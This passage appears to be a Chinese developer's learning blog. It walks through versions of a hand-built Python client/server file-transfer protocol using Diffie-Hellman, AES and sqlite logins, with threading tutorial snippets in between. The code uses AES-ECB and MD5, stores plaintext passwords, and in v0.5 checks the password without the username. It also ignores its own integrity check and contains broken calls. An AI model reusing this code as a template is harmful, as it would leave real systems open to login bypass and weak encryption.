p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 # 创建 DH 参数对象 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() 代码迭代针对一个简单协议所需要的功能已经大体实现了 接下来的任务就是优化服务端和客户端的代码主要的目标大致如下1.添加图形化界面 优化交互过程2.优化代码逻辑 增加注释 提高代码美观度3.完善程序功能 v0.5该版本优化了代码逻辑 完善了注释客户端 import socketimport structimport hashlibimport base64import timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot; 1.传输文本数据 2.传输文件数据 3.新增用户输入选项:&quot;&quot;&quot;def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,base_data,shared_key,sliced,sum,data): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,base_data.decode()) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): #交换公钥 print(&quot;等待连接服务端&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) print(&quot;连接上服务端 开始进行公钥交换&quot;) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;开始进行身份验证&quot;) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) #用户名经过aes加密后传输 s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输 s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password base_data = base64.b64encode(data.encode()) transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode()) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 if len(text) &gt; 1000: sliced = 0 base64_text = base64.b64encode(text.encode()) chunk_size = 1000 sliced_data = slice_string(base64_text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i]) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 base_text = base64.b64encode(text.encode()) transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode()) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() if len(text) &gt; 1000: sliced = 0 chunk_size = 1000 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() for i in range(len(sliced_data)): sliced_basedata = base64.b64encode(sliced_data[i]) transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i]) sliced += 1 s.send(transfer_data) text = (s.recv(1024)).decode() currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 base_text = base64.b64encode(text) transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() 服务端 import socketimport hashlibimport magicfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3import base64mime = magic.Magic(mime=True)conn = sqlite3.connect(&#x27;users.db&#x27;)cursor = conn.cursor()def md5_encrypt(data): md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(s,public_key_server): print(&quot;等待客户机连接&quot;) sock,addr = s.accept() print(f&quot;客户机&#123;sock&#125;&#123;addr&#125;连接成功&quot;) print(&quot;开始进行公钥交换&quot;) public_key_client = sock.recv(1024) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client),sock,addr #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)).decode() return datadef unpack_data(sock,shared_key,orign_data): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) data = base64.b64decode(base_data.encode()) value = verify_md5(data,data_md5,sock) if value == 0: sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) else : sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) return sliced_sum,sliced_num,data_type,data,value def Authentication(sock,shared_key,cursor): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) print(&quot;用户名正确&quot;) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,)) result = cursor.fetchone() if result != None: sock.send(&quot;身份验证通过&quot;.encode()) print(&quot;密码正确&quot;) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 return permission_value else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() return 3 else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() return 3def menu(sock): text = &quot;开始进行数据传输&quot; sock.send(text.encode())def transfer_txt(addr,data): print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)def transfer_file(sock,data): #处理非切片数据 data_type = mime.from_buffer(data) if data_type == &quot;text/plain&quot;: with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f: f.write(data.encode()) sock.send(&quot;成功接受到文件\\n&quot;.encode())def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据 data_bytes = data while sliced_num != sliced_sum-1: orign_data = (sock.recv(2048)) if len(orign_data) == 0: print(&quot;客户机意外中断连接&quot;) return sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data) data_bytes += data data_type = mime.from_buffer(data_bytes) if data_type == &quot;image/png&quot;: with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: with open(&quot;output.mp3&quot;, &#x27;wb&#x27;) as f: f.write(data_bytes) sock.send(&quot;成功接受到文件\\n&quot;.encode()) def register(permission_value,sock,shared_key,cursor,data): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def verify_md5(data, original_md5,sock): current_md5 = md5_encrypt(data) return current_md5 == original_md5def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: public_key_client,sock,addr = key_switch(s,public_key_server) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(&quot;开始进行身份验证&quot;) permission_value = Authentication(sock,shared_key,cursor) if permission_value == 3: print(&quot;客户机意外中断连接&quot;) continue while 1: menu(sock) orign_data = (sock.recv(2048)) if len(orign_data) == 0: print(&quot;客户机意外中断连接&quot;) break sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data) if data_type == 1: transfer_txt(addr,data) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: transfer_file2(sock,data,sliced_sum,sliced_num,shared_key) else: transfer_file(sock,data) elif data_type ==3: register(permission_value,sock,shared_key,cursor,data) sock.close() if __name__ == &quot;__main__&quot;: main() v0.6这一版针对传输过慢的原因进行了排除 感觉是因为传之前过了一遍base64的原因 这里进行了删除以前的代码实际上是没有考虑过多端连接的 所以这一版的代码主要针对多端连接进行优化原本的代码 client1连接后 client2能够连接上服务器 但是交换公钥的时候会阻塞这是因为公钥交换相关的代码没有考虑到多端的情况来假设一种情况 客户机A连接上服务端后 进行密钥交换完成后 开始进入数据传输阶段按照原本的程序设计 此时的服务端程序已经进入了while循环处理数据传输的请求但是如果此时有客户机B想要连接服务端 服务端就不会去处理客户机B的密钥交换为了解决这个问题 应该要使用线程池来处理多线程的情况多线程的实现难点应该在于确保多个线程之间的共享数据同步 在设计程序之间并没有这方面的经验 所以打算先通过编写几个简单的程序来熟悉一下 多线程实现的学习import threadingdef print_name(name): print(f&quot;当前轮到&#123;name&#125;执行&quot;) print(threading.current_thread().name)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,)) thread1.start() thread2.start()if __name__ == &quot;__main__&quot;: main() 通过定义一个thread对象 并且赋值target 即需要该线程执行的函数 同时给予参数定义完成后thread对象完成初始化 通过start来运行线程主进程和线程是同时运行的 如果想要让主进程阻塞 等待线程运行结束后再运行主线程这时候可以使用join来让主进程等待线程执行完毕 import threadingdef print_name(name): print(f&quot;当前轮到&#123;name&#125;执行&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,)) thread1.start() print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)if __name__ == &quot;__main__&quot;: main() 接下来加入join import threadingdef print_name(name): print(f&quot;当前轮到&#123;name&#125;执行&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,)) thread1.start() thread1.join(1) print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)if __name__ == &quot;__main__&quot;: main() join的原理是等待对应thread对象执行完毕 或者给予参数 等待参数时间所以也可以用来规划两个进程的执行先后顺序 import threadingimport timedef print_name(name): time.sleep(0.5) print(f&quot;当前轮到&#123;name&#125;执行&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,)) thread1.start() thread2.start() thread2.join()if __name__ == &quot;__main__&quot;: main() 上述代码应该是先执行thread1 但是由于thread2调用了join 此时应该会先等待thread2执行完毕再执行其他线程 这里print_name函数的sleep也是为了防止thread1执行过快导致还没主进程还没执行thread2.join()就结束了接着来看下面的程序 import threadingimport timedef print_name(name): for i in range(10): time.sleep(0.5) print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) thread1.start() time.sleep(2) print(&quot;主进程即将结束&quot;)if __name__ == &quot;__main__&quot;: main() 按照预期的效果 在输出”主进程即将结束”后 主进程应该就结束了 同时thread1执行全部循环至少需要5s 而主进程执行时间应该在2-5以内 但是事实是主进程要一直等到thread1执行完毕才能结束这一点是由定义thread对象的时候 一个叫daemon的参数决定的其默认值为False 即主进程等待thread1线程执行完毕后才能结束 如果改为True 主进程结束时 线程就会结束 import threadingimport timedef print_name(name): for i in range(10): time.sleep(0.5) print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,),daemon=True) thread1.start() time.sleep(2) print(&quot;主进程即将结束&quot;)if __name__ == &quot;__main__&quot;: main() 如果想要让线程1执行两个函数呢即执行完函数A后再执行函数B 这一点实现起来也很简单 只需要在函数A的最后调用函数B即可 import threadingimport timedef next_task(): print(&quot;这是第二个任务&quot;)def print_name(name): print(&quot;这是第一个任务&quot;) next_task()def main(): print(&quot;多线程测试&quot;) thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,)) thread1.start()if __name__ == &quot;__main__&quot;: main() 但是这一操作的弊端也很明显 那就是假如此时我们需要创建两个线程线程1需要先执行函数A再执行函数B线程2需要先执行函数B再执行函数A这时候就会产生冲突 这又得去编写一个中转函数来识别需求 然后做if分支了 显然十分麻烦这时候就可以自定义thread类 import threadingimport timeclass myself_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def run(self): print(f&quot;这是线程&#123;self.name&#125;在运行&quot;) def test(self): print(&quot;这是一个测试函数&quot;)def main(): print(&quot;多线程测试&quot;) thread1 = myself_thread() thread1.run() thread1.start() thread1.test() if __name__ == &quot;__main__&quot;: main() 如上述代码 我们自定义了一个myself_thread类 并且继承了threading.Thread 这个类的run函数以及其他函数都可以由我们自定义 针对不同的需求来调用函数也变得十分简单如果服务端采用这种方式来新增线程 考虑到如果遭受ddos攻击 那么处理的线程数就会过多这时候应该考虑采用线程池的方法来处理线程池在程序启动时就创建大量空闲线程 在程序需要线程来执行函数的时候 就会分配一个线程出来 当线程执行完毕后 又会回到线程池 因此使用线程池可以有效的控制程序中并发线程的数量运行下面这个程序 创建一个含有10个空闲线程的线程池 from concurrent.futures import ThreadPoolExecutorimport threadingimport timedef print_name(): print(f&quot;现在是线程&#123;threading.current_thread().name&#125;正在执行&quot;)pool = ThreadPoolExecutor(max_workers=10)thread1 = pool.submit(print_name)thread2 = pool.submit(print_name) 输出的结果为说明执行时间过短 在线程0执行完毕后 就作为空闲线程返回线程池 随后第二次需要执行print_name函数的时候 就又被分配出来了为了印证猜想 在print_name函数中加入time.sleep(0.5)这时就是由两个线程来处理了还可以使用map方法来并发的调用线程 不过需要注意的是 (1,2,3)是赋予给print_name函数的参数 但是实际上print_name不需要参数 这一点暂时还没找到方法来优化 总感觉有点多余 但是不给予参数 map又无法指定调用多少个线程 from concurrent.futures import ThreadPoolExecutorimport threadingimport timedef print_name(number): print(f&quot;现在是线程&#123;threading.current_thread().name&#125;正在执行&quot;)pool = ThreadPoolExecutor(max_workers=10)thread = pool.map(print_name,(1,2,3)) 最后的输出结果仍然是全部由线程0来负责 说明map方法就是简化了多个submit方法 多线程应用目前的整改思路如下:服务端:主进程负责处理accpet 有客户机连接就调用一个线程来处理密钥交换和数据传输 然后这个线程就专门负责这台客户机 如果客户机中断连接 那就释放线程 回到线程池客户端:这块的整改还在考虑中 因为就目前来说 传输效率确实有点感人了 传一个10mb的音频都需要十来分钟 如果客户端改成 可以并发的传输数据 即同时传输音频和图像 或者是把一个音频拆成多个线程来传输 这样效率应该可以大大提高 但是感觉编写难度有点大啊 看着来吧服务端 import socketimport hashlibimport magicfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3import base64from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(sock,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)).decode(&#x27;latin1&#x27;) return datadef unpack_data(sock,shared_key,orign_data): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == 0: sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) else : sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) return sliced_sum,sliced_num,data_type,datadef Authentication(sock,shared_key,query_thread1): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) result = query_thread1.query_username(username) if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 return permission_value else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() return 3 else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() return 3def menu(sock): text = &quot;开始进行数据传输&quot; sock.send(text.encode())def transfer_txt(addr,data): print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)def transfer_file(sock,data): #处理非切片数据 if isinstance(data,str): data = data.encode( ) data_type = mime.from_buffer(data) if data_type == &quot;text/plain&quot;: with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f: f.write(data) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;成功接受到文件&quot;)def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据 data_bytes = data while sliced_num != sliced_sum-1: orign_data = (sock.recv(3000)) if len(orign_data) == 0: print(&quot;客户机中断连接&quot;) return sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data) data_bytes += data data_type = mime.from_buffer(data_bytes) if data_type == &quot;image/png&quot;: with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: with open(&quot;output.mp3&quot;, &#x27;wb&#x27;) as f: f.write(data_bytes) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;成功接受到文件&quot;) def register(permission_value,sock,data,query_thread1): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] query_thread1.adduser(sock,username,password) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)def verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;开始进行身份验证&quot;) permission_value = Authentication(sock,shared_key,query_thread1) print(f&quot;&#123;threading.current_thread().name&#125;身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) if permission_value == 3: print(f&quot;&#123;threading.current_thread().name&#125;客户机中断连接&quot;) return while 1: menu(sock) orign_data = (sock.recv(3000)) if len(orign_data) == 0: print(f&quot;&#123;threading.current_thread().name&#125;客户机中断连接&quot;) break sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data) if data_type == 1: transfer_txt(addr,data) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: transfer_file2(sock,data,sliced_sum,sliced_num,shared_key) else: transfer_file(sock,data) elif data_type ==3: register(permission_value,sock,data,query_thread1)def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() 客户端 import socketimport structimport hashlibimport base64import timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot; 1.传输文本数据 2.传输文件数据 3.新增用户 4.断开连接输入选项:&quot;&quot;&quot;def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) if isinstance(data,str): data = data.encode() hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): #交换公钥 print(&quot;等待连接服务端&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) print(&quot;连接上服务端 开始进行公钥交换&quot;) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;开始进行身份验证&quot;) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) #用户名经过aes加密后传输 s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输 s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 if len(text) &gt; 1000: sliced = 0 chunk_size = 1000 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 